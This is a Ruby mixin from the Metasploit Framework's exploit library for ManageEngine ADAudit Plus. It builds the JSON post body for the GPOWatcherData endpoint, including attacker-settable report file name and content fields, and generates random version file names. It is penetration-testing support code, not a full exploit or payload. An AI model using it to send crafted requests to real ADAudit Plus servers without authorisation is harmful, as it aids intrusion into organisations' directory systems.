# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::ManageEngineAdauditPlus::JsonPostData
  # Generates a JSON hash according to the format required by the GPOWatcherData endpoint
  #
  # @param options [Hash] Hash containing parameters to include in the JSON hash.
  # @option options [Boolean] :isGPOData Is the data GPO data? This is set to true if so, otherwise its set to false.
  # @option options [String] :DOMAIN_NAME Name of the domain being targeted.
  # @option options [String] :GPO_GUID The GPO GUID to use.
  # @option options [Integer] :GPO_VERSION The version number of the GPO GUID in use, or a random number from 1 to 9 if one is not supplied.
  # @option options [String] :VER_FILE_NAME The version file name in a format that matches ADAudit Plus's VER_FILE_NAME format.
  # @option options [String] :xmlReport An XML string containing the header to use for the report.
  # @option options [String] :Html_fileName The filename to use for the post request if provided.
  # @option options [String] :htmlReport The location to save the HTML report if provided.
  # @return [String] A string representation of the JSON hash matching the
  #   format required by the GPOWatcherData endpoint. Will be an empty string
  #   if the options param is invalid.
  def generate_gpo_watcher_data_json(options)
    post_data = {}
    return post_data.to_json unless options.is_a?(Hash)

    post_data['isGPOData'] = options['isGPOData'] || true
    post_data['DOMAIN_NAME'] = options['DOMAIN_NAME'] || ''
    post_data['GPO_GUID'] = options['GPO_GUID'] || Rex::Proto::MsDtyp::MsDtypGuid.random_generate
    post_data['GPO_VERSION'] = options['GPO_VERSION'] || rand(1..9)
    post_data['VER_FILE_NAME'] = options['VER_FILE_NAME'] || generate_ver_file_name
    post_data['xmlReport'] = options['xmlReport'] || '<?xml version="1.0" encoding="utf-16"?>'

    html_fileName = options['Html_fileName']
    post_data['Html_fileName'] = html_fileName if html_fileName

    html_report = options['htmlReport']
    post_data['htmlReport'] = html_report if html_report

    post_data.to_json
  end

  # Returns a String matching the VER_FILE_NAME format used by ADAudit Plus
  #
  # @return [String] Randomly generated String matching the VER_FILE_NAME format used by ADAudit Plus
  def generate_ver_file_name
    "#{rand(1..9)}_#{Rex::Text.rand_text_alphanumeric(18)}".downcase + '.xml'
  end
end
